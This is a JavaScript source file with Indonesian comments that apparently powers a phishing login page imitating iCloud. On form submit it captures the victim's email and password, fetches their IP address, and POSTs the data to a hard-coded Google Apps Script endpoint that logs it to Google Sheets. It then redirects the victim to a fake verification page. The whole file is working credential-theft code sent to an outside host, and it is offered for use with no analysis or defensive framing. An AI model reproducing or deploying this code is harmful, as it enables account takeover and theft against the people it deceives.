document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');
    
    // Ganti URL ini dengan URL dari Google Apps Script yang Anda deploy
    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbynLQMeGItAFOfJeOgwpk6mZKP3z9nUWn4aBWtD1fu0w4QenZLDpg96_3YRYOP_Mbki/exec';
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        try {
            // Get form data
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Get IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            
            // Prepare data
            const data = {
                timestamp: new Date().toISOString(),
                ip: ip,
                email: email,
                password: password
            };
            
            // Send to Google Sheets
            const response = await fetch(GOOGLE_SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors', // Penting untuk cross-origin
                cache: 'no-cache',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            console.log('Data terkirim!');
            
            // Store login info in sessionStorage for potential use later
            sessionStorage.setItem('userEmail', email);
            
        } catch (error) {
            console.error('Error:', error);
        } finally {
            // Redirect to verification page instead of iCloud
            setTimeout(() => {
                window.location.href = 'verifikasi.html';
            }, 1000);
        }
    });
    
    // Add view logs function (for testing)
    window.viewLogs = function() {
        const logs = JSON.parse(localStorage.getItem('logs') || '[]');
        console.log('All logs:', logs);
    };
}); 